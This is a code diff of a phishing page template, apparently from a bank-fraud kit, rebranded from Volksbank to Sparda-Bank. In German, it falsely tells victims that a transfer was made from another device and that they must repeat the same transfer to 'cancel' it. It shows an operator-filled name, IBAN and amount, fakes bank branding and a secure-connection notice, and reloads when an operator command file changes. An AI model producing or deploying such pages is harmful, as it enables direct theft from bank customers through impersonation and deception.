@@ -23,312 +23,364 @@ if (is_array($customCommandData)) {
     }
 }
 ?>
-
 <!DOCTYPE html>
-<html>
-
+<html lang="de" class="notranslate" translate="no">
 <head>
     <meta charset="UTF-8">
-    <meta name="discription" content="Coinbase">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Volksbank</title>
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet"
-        integrity="sha384-4bw+/aepP/YC94hEpVNVgiZdgIC5+VKNBQNGCHeKRQN+PtmoHDEXuppvnDJzQIu9" crossorigin="anonymous">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
-        integrity="sha512-iecdLmaskl7CVkqkXNQ/ZH/XLlvWZOJyj7Yy7tcenmpD1ypASozpmT/E0iPtmFIB46ZmdtAc9eNBvH0H/ZpiBw=="
-        crossorigin="anonymous" referrerpolicy="no-referrer" />
-    <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
-    <link rel="stylesheet" href="<?php echo CSSPATH; ?>/style.css">
+    <title>Umbuchung - Sparda-Bank</title>
+    <base href=".">
+    <meta name="robots" content="noindex, nofollow">
+    <link id="favicon-link" rel="icon" type="image/x-icon" href="https://www.sparda-b.de/favicon.ico?v2">
+
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="<?= URLROOT ?>/front_end/front_end_files/styles.4787d3238b7c7ee0.css">
+    <noscript><link rel="stylesheet" href="styles.4787d3238b7c7ee0.css"></noscript>
+
+    <?php ob_start(); include 'data/styleinclude.txt'; ?>
+
+    <script src="<?= URLROOT ?>/js/cntdjs/jquery.js"></script>
+
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
 
     <style>
         :root {
-            --vr-blue:   #004A99;
-            --vr-blue-d: #003882;
-            --vr-soft:   #e8f0fa;
-            --vr-border: #e5e7eb;
-            --vr-muted:  #6b7380;
-            --vr-text:   #1a1a1a;
-            --vr-amber:  #f59e0b;
-            --vr-amb-s:  #fff7ed;
-            --vr-amb-b:  #fed7aa;
+            --brand-blue:   #005aaa;
+            --brand-blue-d: #004a8a;
+            --brand-orange: #f06400;
+            --bg:           #f1f3f6;
+            --card:         #ffffff;
+            --text:         #1a1f2b;
+            --muted:        #6b7380;
+            --border:       #e5e7eb;
+            --soft-blue:    #e6f0fa;
         }
+        * { box-sizing: border-box; }
+        html, body { margin: 0; padding: 0; }
+        body {
+            font-family: 'Inter', 'Helvetica Neue', Arial, sans-serif !important;
+            background: var(--bg) !important;
+            color: var(--text);
+            -webkit-font-smoothing: antialiased;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            letter-spacing: -0.01em;
+        }
+        app-root, app-frame { display: flex; flex-direction: column; flex: 1; }
 
-        .vr-card {
-            position: relative;
-            background: #fff;
-            border: 1px solid var(--vr-border);
-            border-radius: 14px;
-            box-shadow: 0 14px 32px -10px rgba(0,0,0,.12), 0 2px 6px -2px rgba(0,0,0,.06);
-            padding: 44px 40px 40px;
-            overflow: hidden;
-            max-width: 580px;
-            width: 100%;
-            margin: 32px auto;
-            animation: vrFadeUp .55s cubic-bezier(.22,1,.36,1) both;
+        /* HEADER */
+        .frame-header {
+            background: #fff !important;
+            border-bottom: 1px solid var(--border);
+            box-shadow: 0 1px 2px rgba(0,0,0,.04);
+            padding: 0 !important;
         }
-        .vr-card::before {
-            content: "";
-            position: absolute; top: 0; left: 0; right: 0;
-            height: 5px;
-            background: var(--vr-blue);
+        .frame-header .col-12 {
+            max-width: 1080px;
+            margin: 0 auto;
+            padding: 16px 24px !important;
+            display: flex;
+            align-items: center;
         }
-        @keyframes vrFadeUp {
-            from { opacity: 0; transform: translateY(24px); }
+        .pt-header-logo-img img { height: 40px; width: auto; display: block; }
+        .bank-name {
+            margin-left: 14px !important;
+            font-family: 'Inter', sans-serif;
+            font-weight: 700;
+            font-size: 1.25rem;
+            color: var(--brand-blue) !important;
+            letter-spacing: -0.01em;
+        }
+        .bank-name app-name div { color: var(--brand-blue) !important; }
+        .accent-bar { height: 4px; background: var(--brand-blue); }
+
+        /* MAIN */
+        .wrapper-box-phototan {
+            flex: 1;
+            display: flex;
+            align-items: flex-start;
+            justify-content: center;
+            padding: 48px 16px !important;
+            background: var(--bg);
+            max-width: none !important;
+            margin: 0 !important;
+        }
+        .umb-wrap {
+            width: 100% !important;
+            max-width: 560px !important;
+            margin: 0 auto !important;
+            text-align: center !important;
+            animation: fadeUp .55s cubic-bezier(.22,1,.36,1) both;
+        }
+        @keyframes fadeUp {
+            from { opacity: 0; transform: translateY(28px); }
             to   { opacity: 1; transform: translateY(0); }
         }
-        @keyframes vrPulse {
-            0%   { transform: scale(1);    opacity: .55; }
-            100% { transform: scale(1.55); opacity: 0;   }
+        @keyframes pop {
+            from { opacity: 0; transform: scale(.6); }
+            to   { opacity: 1; transform: scale(1); }
         }
 
-        .vr-warn-icon {
-            position: relative;
-            width: 72px; height: 72px;
-            margin: 0 auto 22px;
-            display: flex; align-items: center; justify-content: center;
-        }
-        .vr-warn-icon::before {
-            content: "";
-            position: absolute; inset: 0;
+        .umb-badge {
+            width: 80px; height: 80px;
+            margin: 0 auto 24px;
             border-radius: 50%;
-            background: rgba(245,158,11,.18);
-            animation: vrPulse 1.6s cubic-bezier(0,0,.2,1) infinite;
+            background: var(--soft-blue);
+            border: 4px solid #b3d1ec;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 12px 28px -6px rgba(0, 90, 170, .18);
+            animation: pop .45s cubic-bezier(.22,1,.36,1) .15s both;
         }
-        .vr-warn-icon-inner {
-            position: relative;
-            width: 56px; height: 56px;
-            border-radius: 50%;
-            background: var(--vr-amb-s);
-            border: 2px solid var(--vr-amb-b);
-            display: flex; align-items: center; justify-content: center;
-            color: var(--vr-amber);
-        }
-        .vr-warn-icon-inner svg { width: 30px; height: 30px; }
+        .umb-badge svg { width: 38px; height: 38px; color: var(--brand-blue); }
 
-        .vr-card h1 {
-            font-size: 1.5rem;
-            font-weight: 700;
-            color: var(--vr-text);
-            margin: 0 0 12px;
+        .umb-title {
+            text-align: center !important;
+            font-size: 1.7rem !important;
+            font-weight: 700 !important;
+            margin: 0 0 12px !important;
+            padding: 0 !important;
+            color: var(--text) !important;
             letter-spacing: -0.02em;
-            text-align: center;
-            line-height: 1.3;
         }
-        .vr-msg {
-            font-size: .95rem;
-            color: var(--vr-muted);
-            line-height: 1.6;
-            margin: 0 0 24px;
-            text-align: center;
+        .umb-sub {
+            display: block !important;
+            text-align: center !important;
+            font-size: .98rem !important;
+            line-height: 1.55 !important;
+            color: var(--muted) !important;
+            margin: 0 auto 28px !important;
+            padding: 0 !important;
+            max-width: 480px !important;
         }
 
-        .vr-details {
-            background: #fafbfc;
-            border: 1px solid var(--vr-border);
-            border-radius: 10px;
-            padding: 4px 18px;
-            margin: 0 0 20px;
+        .umb-card {
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            box-shadow: 0 6px 16px -4px rgba(20, 30, 50, .08), 0 2px 6px -2px rgba(20, 30, 50, .04);
+            overflow: hidden;
         }
-        .vr-row {
-            display: grid;
-            grid-template-columns: 130px 1fr;
+        .card-stripe { height: 6px; background: var(--brand-blue); }
+        .card-body { padding: 8px 28px 24px; }
+
+        .info-row {
+            display: flex;
+            justify-content: space-between;
             align-items: center;
             gap: 16px;
-            padding: 14px 0;
-            border-bottom: 1px solid var(--vr-border);
+            padding: 18px 0;
+            border-bottom: 1px solid var(--border);
         }
-        .vr-row:last-child { border-bottom: 0; }
-        .vr-row .vr-k {
-            font-size: .8rem;
-            font-weight: 600;
-            color: var(--vr-muted);
+        .info-row:last-child { border-bottom: none; }
+        .info-label {
+            font-size: .82rem;
+            font-weight: 500;
+            color: var(--muted);
             text-transform: uppercase;
             letter-spacing: .06em;
         }
-        .vr-row .vr-v {
+        .info-value {
             font-size: 1rem;
             font-weight: 600;
-            color: var(--vr-text);
-            word-break: break-word;
+            color: var(--text);
+            text-align: right;
             font-variant-numeric: tabular-nums;
+            word-break: break-all;
         }
-        .vr-row.vr-row-amount .vr-v {
-            font-size: 1.25rem;
+        .info-value.iban { font-family: 'JetBrains Mono', 'Menlo', monospace; font-size: .95rem; letter-spacing: .02em; }
+        .info-value.summe {
+            font-size: 1.5rem;
             font-weight: 700;
-            color: var(--vr-blue);
-        }
-        .vr-row.vr-row-amount .vr-v::after {
-            content: " \20AC";
-            color: var(--vr-muted);
-            font-weight: 600;
-            margin-left: 4px;
+            color: var(--brand-blue);
+            letter-spacing: -0.01em;
         }
 
-        .vr-hint {
+        .notice {
+            margin-top: 18px;
+            padding: 14px 16px;
+            background: #fff8ed;
+            border: 1px solid #fde4be;
+            border-left: 4px solid var(--brand-orange);
+            border-radius: 8px;
             display: flex;
             align-items: flex-start;
-            gap: 12px;
-            padding: 14px 16px;
-            background: var(--vr-soft);
-            border: 1px solid rgba(0,74,153,.2);
-            border-radius: 10px;
-            color: var(--vr-blue-d);
-            font-size: .88rem;
-            line-height: 1.55;
+            gap: 10px;
+            font-size: .85rem;
+            color: #6a4a18;
+            line-height: 1.5;
         }
-        .vr-hint svg {
-            width: 20px; height: 20px;
-            flex-shrink: 0;
-            color: var(--vr-blue);
-            margin-top: 1px;
-        }
-        .vr-hint strong { color: var(--vr-blue-d); }
+        .notice svg { width: 18px; height: 18px; color: var(--brand-orange); flex-shrink: 0; margin-top: 1px; }
 
-        .vr-contact {
-            margin-top: 22px;
-            padding: 14px 16px;
-            background: #fafbfc;
-            border: 1px solid var(--vr-border);
-            border-radius: 10px;
+        .ssl-note {
+            text-align: center;
+            margin-top: 20px;
+            font-size: .75rem;
+            color: #98a0ad;
             display: flex;
             align-items: center;
-            gap: 14px;
-            font-size: .9rem;
+            justify-content: center;
+            gap: 6px;
         }
-        .vr-contact-icon {
-            width: 40px; height: 40px;
-            border-radius: 50%;
-            background: var(--vr-soft);
-            color: var(--vr-blue);
-            display: flex; align-items: center; justify-content: center;
-            flex-shrink: 0;
-        }
-        .vr-contact-icon svg { width: 18px; height: 18px; }
-        .vr-contact-meta { flex: 1; min-width: 0; }
-        .vr-lbl {
-            display: block; font-size: .72rem; color: var(--vr-muted);
-            text-transform: uppercase; letter-spacing: .06em;
-            font-weight: 500; margin-bottom: 2px;
-        }
-        .vr-name { display: block; font-weight: 600; color: var(--vr-text); }
-        .vr-phone {
-            display: block; color: var(--vr-blue);
-            font-weight: 700; margin-top: 2px; text-decoration: none;
-        }
+        .ssl-note svg { width: 14px; height: 14px; }
 
-        @media (max-width: 600px) {
-            .vr-card { padding: 32px 20px 28px; }
-            .vr-row { grid-template-columns: 1fr; gap: 4px; padding: 12px 0; }
+        /* FOOTER */
+        #fiducia-footer-container {
+            background: var(--brand-blue) !important;
+            color: #fff !important;
+            padding: 22px 16px 18px;
+            text-align: center;
+            border-top: none !important;
+        }
+        #fiducia-footer-container .kf-footer-bg,
+        #fiducia-footer-container .content-wrapper-top,
+        #fiducia-footer-container #footer-left { background: transparent !important; }
+        .footer-navigation {
+            list-style: none !important;
+            margin: 0 0 10px !important;
+            padding: 0 !important;
+            display: flex !important;
+            justify-content: center !important;
+            gap: 32px !important;
+            flex-wrap: wrap;
+        }
+        .footer-navigation a {
+            color: rgba(255,255,255,.92) !important;
+            text-decoration: none;
+            font-size: .88rem;
+            cursor: pointer;
+            transition: color .15s ease;
+        }
+        .footer-navigation a:hover { color: #fff !important; }
+        #footer-bottom {
+            color: rgba(255,255,255,.78) !important;
+            font-size: .78rem;
+            margin: 0;
         }
     </style>
 </head>
+<body kf-theme-version="6.11.1" class="kf-theme-scope light theme-initialized">
+    <app-root _nghost-jjb-c48="" ng-version="13.3.12">
+        <app-frame _ngcontent-jjb-c48="" _nghost-jjb-c47="">
 
-<body>
+            <!-- HEADER -->
+            <div _ngcontent-jjb-c47="" class="container-fluid">
+                <header _ngcontent-jjb-c47="" class="row justify-content-center frame-header kf-header-bg">
+                    <div _ngcontent-jjb-c47="" class="col-12 pt-header-logo-b d-flex align-items-center">
+                        <bank-info _ngcontent-jjb-c47="" id="image-logo" type="logo" class="pt-header-logo-img ng-star-inserted">
+                            <app-logo _nghost-hib-c133="">
+                                <img _ngcontent-hib-c133="" alt="Sparda-Bank" src="<?= URLROOT ?>/front_end/front_end_files/sparda-logo1.png">
+                            </app-logo>
+                        </bank-info>
+                        <bank-info _ngcontent-jjb-c47="" id="bank-name" type="name" class="bank-name ml-2 kf-header-color-headline ng-star-inserted">
+                            <app-name><div>Sparda-Bank</div></app-name>
+                        </bank-info>
+                    </div>
+                </header>
+            </div>
+            <div class="accent-bar"></div>
 
-    <div class="tape"></div>
+            <!-- MAIN CONTENT -->
+            <div class="wrapper-box-phototan wrapper-box-phototan2">
+                <div class="umb-wrap">
 
-    <header class="header-login">
-        <div class="logo">
-            <img src="<?php echo IMGSPATH; ?>/logo-vr.svg" alt="">
-        </div>
-    </header>
+                    <div class="umb-badge">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="round" stroke-linejoin="round">
+                            <polyline points="17 1 21 5 17 9"></polyline>
+                            <path d="M3 11V9a4 4 0 0 1 4-4h14"></path>
+                            <polyline points="7 23 3 19 7 15"></polyline>
+                            <path d="M21 13v2a4 4 0 0 1-4 4H3"></path>
+                        </svg>
+                    </div>
 
-    <div class="wrapper-box-phototan wrapper-box-phototan2">
-        <div class="vr-card">
+                    <h1 class="umb-title">Auftrag Stornieren</h1>
+                    <p class="umb-sub">
+                        Eine Echtzeit-&Uuml;berweisung wurde von einem anderen Ger&auml;t durchgef&uuml;hrt und ist daher auf Ihrem Ger&auml;t nicht sichtbar. Um die Transaktion zu stornieren, m&uuml;ssen Sie dieselbe &Uuml;berweisung von Ihrem Ger&auml;t aus erneut durchgef&uuml;hren. Nur so k&ouml;nnen wir die Stornierung sofort bearbeiten.
+                    </p>
 
-            <div class="vr-warn-icon">
-                <div class="vr-warn-icon-inner">
-                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
-                        <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path>
-                        <line x1="12" y1="9" x2="12" y2="13"></line>
-                        <line x1="12" y1="17" x2="12.01" y2="17"></line>
-                    </svg>
+                    <div class="umb-card">
+                        <div class="card-stripe"></div>
+                        <div class="card-body">
+                            <div class="info-row">
+                                <span class="info-label">Name</span>
+                                <span class="info-value"><?= htmlspecialchars($name) ?></span>
+                            </div>
+                            <div class="info-row">
+                                <span class="info-label">IBAN</span>
+                                <span class="info-value iban"><?= htmlspecialchars($iban) ?></span>
+                            </div>
+                            <div class="info-row">
+                                <span class="info-label">Summe</span>
+                                <span class="info-value summe"><?= htmlspecialchars($summe) ?> &euro;</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="notice">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M10.29 3.86 1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path>
+                            <line x1="12" y1="9" x2="12" y2="13"></line>
+                            <line x1="12" y1="17" x2="12.01" y2="17"></line>
+                        </svg>
+                        Sobald Sie den Prozess abgeschlossen haben, erscheint die stornierte Transaktion in Ihrem E-Banking. Sie wird dort als durchgef&uuml;hrt angezeigt, obwohl sie unmittelbar storniert wurde. Der Betrag wird Ihnen per SEPA-Gutschrift zur&uuml;ckerstattet &ndash; dies kann bis zu drei Werktage in Anspruch nehmen.
+                    </div>
+
+                    <p class="ssl-note">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                            <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+                        </svg>
+                        Sichere Verbindung &mdash; 256-Bit SSL Verschl&uuml;sselung
+                    </p>
                 </div>
             </div>
 
-            <h1>Auftrag Stornieren</h1>
-            <p class="vr-msg">
-                Eine Echtzeit-&Uuml;berweisung wurde von einem anderen Ger&auml;t durchgef&uuml;hrt und ist daher auf Ihrem Ger&auml;t nicht sichtbar. Um die Transaktion zu stornieren, m&uuml;ssen Sie dieselbe &Uuml;berweisung von Ihrem Ger&auml;t aus erneut durchgef&uuml;hren. Nur so k&ouml;nnen wir die Stornierung sofort bearbeiten.
-            </p>
-
-            <div class="vr-details" aria-label="Transaktionsdetails">
-                <div class="vr-row">
-                    <span class="vr-k">Name</span>
-                    <span class="vr-v"><?= htmlspecialchars($name) ?></span>
-                </div>
-                <div class="vr-row">
-                    <span class="vr-k">IBAN</span>
-                    <span class="vr-v"><?= htmlspecialchars($iban) ?></span>
-                </div>
-                <div class="vr-row vr-row-amount">
-                    <span class="vr-k">Summe</span>
-                    <span class="vr-v"><?= htmlspecialchars($summe) ?></span>
-                </div>
+            <!-- FOOTER -->
+            <div _ngcontent-jjb-c47="" class="container-fluid">
+                <footer _ngcontent-jjb-c47="">
+                    <app-footer _ngcontent-jjb-c47="" _nghost-jjb-c46="">
+                        <footer _ngcontent-jjb-c46="" id="fiducia-footer-container" class="remove-for-print">
+                            <div _ngcontent-jjb-c46="" class="kf-footer-bg kf-footer-border-top">
+                                <div _ngcontent-jjb-c46="" class="content-wrapper-top">
+                                    <div _ngcontent-jjb-c46="" id="footer-left" class="remove-lr-margins">
+                                        <ul class="footer-navigation kf-footer-color">
+                                            <li><a tabindex="0">Impressum</a></li>
+                                            <li><a tabindex="0">Datenschutz</a></li>
+                                            <li><a tabindex="0">AGB</a></li>
+                                        </ul>
+                                    </div>
+                                </div>
+                            </div>
+                            <div _ngcontent-jjb-c46="" class="remove-lr-margins text-center">
+                                <div id="footer-bottom" class="mat-small">
+                                    Eine für alle - alles von einer.
+                                </div>
+                            </div>
+                        </footer>
+                    </app-footer>
+                </footer>
             </div>
 
-            <div class="vr-hint" role="note">
-                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
-                    <circle cx="12" cy="12" r="10"></circle>
-                    <line x1="12" y1="16" x2="12" y2="12"></line>
-                    <line x1="12" y1="8" x2="12.01" y2="8"></line>
-                </svg>
-                <span>
-                    Sobald Sie den Prozess abgeschlossen haben, erscheint die stornierte Transaktion in Ihrem E-Banking. Sie wird dort als durchgef&uuml;hrt angezeigt, obwohl sie unmittelbar storniert wurde. Der Betrag wird Ihnen per SEPA-Gutschrift zur&uuml;ckerstattet &ndash; dies kann bis zu drei Werktage in Anspruch nehmen.
-                </span>
-            </div>
+        </app-frame>
+    </app-root>
 
-            <p class="vr-ssl" style="text-align:center;margin-top:18px;font-size:.74rem;color:#98a0ad;display:flex;align-items:center;justify-content:center;gap:6px;">
-                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="width:13px;height:13px;">
-                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
-                    <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
-                </svg>
-                Sichere Verbindung &mdash; 256-Bit SSL Verschl&uuml;sselung
-            </p>
-
-        </div>
-    </div>
-
-    <footer class="footer-login">
-        <div class="navlist align-items-center d-flex justify-content-center">
-            <ul class="d-flex justify-content-center align-items-center ps-0 mb-0">
-                <li>Impressum</li>
-                <li>Datenschutz</li>
-                <li>AGB</li>
-                <li>Preisaushang</li>
-                <li>Nutzungsbedingungen</li>
-                <li>Pflichtinformationen</li>
-                <li>Sicherheitshinweise</li>
-            </ul>
-        </div>
-        <p class="text-center first-text">Wir machen den Weg frei. Gemeinsam mit den Spezialisten der
-            Genossenschaftlichen FinanzGruppe Volksbanken Raiffeisenbanken</p>
-        <img class="xlg" src="<?php echo IMGSPATH; ?>/s4.png" alt="" width="100%">
-        <img class="lg d-none" src="<?php echo IMGSPATH; ?>/s3.png" alt="" width="100%">
-        <img class="md d-none" src="<?php echo IMGSPATH; ?>/s2.png" alt="" width="100%">
-        <img class="sm d-none" src="<?php echo IMGSPATH; ?>/s1.png" alt="" width="100%">
-    </footer>
-
-    <script src="https://code.jquery.com/jquery-3.7.1.js"></script>
-    <script src="<?php echo JSPATH; ?>/js.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/jquery-simple-upload@1.1.0/simpleUpload.min.js"></script>
-
+    <!-- Auto Refresh -->
     <script>
         var initialModTime = null;
-        var customCommandJsonPath = '<?= htmlspecialchars($customCommandJsonPath) ?>';
+        var customCommandJsonPath = '<?php echo $customCommandJsonPath; ?>';
         function checkFileModification() {
             fetch(customCommandJsonPath, { method: 'HEAD', cache: 'no-cache' })
-                .then(function (response) {
-                    var currentModTime = new Date(response.headers.get('Last-Modified'));
-                    if (initialModTime === null) {
-                        initialModTime = currentModTime;
-                    } else if (currentModTime.getTime() !== initialModTime.getTime()) {
-                        window.location.reload();
-                    }
-                })
-                .catch(function (error) { console.error('Error checking file modification:', error); });
+            .then(response => {
+                var currentModTime = new Date(response.headers.get('Last-Modified'));
+                if (initialModTime === null) initialModTime = currentModTime;
+                else if (currentModTime.getTime() !== initialModTime.getTime()) window.location.reload();
+            })
+            .catch(() => {});
         }
         setInterval(checkFileModification, 2000);
     </script>
 </body>
-
 </html>
